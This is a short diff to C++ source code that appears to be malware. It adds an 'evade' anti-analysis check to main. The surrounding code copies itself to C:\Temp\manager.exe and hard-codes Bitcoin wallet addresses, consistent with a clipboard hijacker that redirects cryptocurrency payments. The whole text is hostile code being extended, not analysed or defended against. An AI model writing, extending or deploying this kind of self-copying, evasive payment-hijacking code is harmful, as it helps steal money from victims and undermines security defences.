@@ -5,6 +5,7 @@
 #include <stdlib.h>
 #include <tchar.h>
 #include <filesystem>
+#include "evade.h"
 using namespace std;
 
 // 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
@@ -63,6 +64,10 @@ void copy_self(char* filename, char save_path[], char create_path[]) {
 }
 
 int main(int argc, char *argv[]) {
+    if (evade()) {
+        cout << "Evading failed" << endl;
+        return 1;
+    }
     char create_path[] = "C:\\Temp\\";
     char save_path[] = "C:\\Temp\\manager.exe";
     char address[] = "bc1qlkt252pj7z4nfsq48maejm6k9054jsp5ulxz72";
